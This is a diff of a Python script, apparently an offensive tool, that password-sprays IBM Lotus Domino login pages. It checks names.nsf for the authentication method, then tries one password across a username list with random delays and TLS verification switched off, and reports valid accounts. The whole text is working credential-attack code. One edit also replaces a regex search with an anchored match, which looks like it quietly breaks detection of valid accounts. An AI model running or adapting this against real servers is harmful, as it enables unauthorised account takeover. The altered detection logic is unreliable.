@@ -30,6 +30,7 @@ requests.packages.urllib3.disable_warnings()
 def get_auth_type(target, header, usernames, password):
 	names_url = "{0}/names.nsf".format(target)
 	request = requests.get(names_url, headers=header, timeout=3, allow_redirects=False, verify=False)
+
 	# Check for landing page
 	if request.status_code == 200:
 		post_regex = re.search('((?i)method=\'post\'|method=\"post\"|method=post)', request.text)
@@ -37,9 +38,11 @@ def get_auth_type(target, header, usernames, password):
 			auth_type = 'post'
 		else:
 			auth_type = 'get'
+
 	# No landing page, authentication uses get
 	elif request.status_code == 401:
 		auth_type = 'get'
+
 	# Assume authentication uses get
 	else:
 		utility.print_warn('Could not access names.nsf!')
@@ -55,12 +58,11 @@ def reverse_bruteforce(target, header, usernames, password, auth):
 	# Import usernames from file
 	username_file = open(usernames, 'r')
 	for username in username_file:
-		username_list.append(username.strip('\n'))
+		username_list.append(username.rstrip())
 	username_file.close()
 
 	# Start reverse bruteforce
 	for username in username_list:
-		# Add short jitter
 		jitter = random.random()
 		time.sleep(jitter)
 		try:
@@ -77,15 +79,15 @@ def reverse_bruteforce(target, header, usernames, password, auth):
 
 			# Handle 200 response
 			if request.status_code == 200:
-				notes_regex = re.search('((?i)name=\'NotesView\'|name=\"NotesView\"|name=NotesView)', request.text)
-				if notes_regex:
+				notes_regex = re.compile('name=\'NotesView\'|name=\"NotesView\"|name=NotesView', re.I)
+				if notes_regex.match(request.text):
 					utility.print_good("Found valid account: {0}:{1}".format(username, password))
 					valid_usernames.append(username)
 				else:
 					pass
-			# Handle other responses
 			else:
 				pass
+
 		except KeyboardInterrupt:
 			break
 		except Exception:
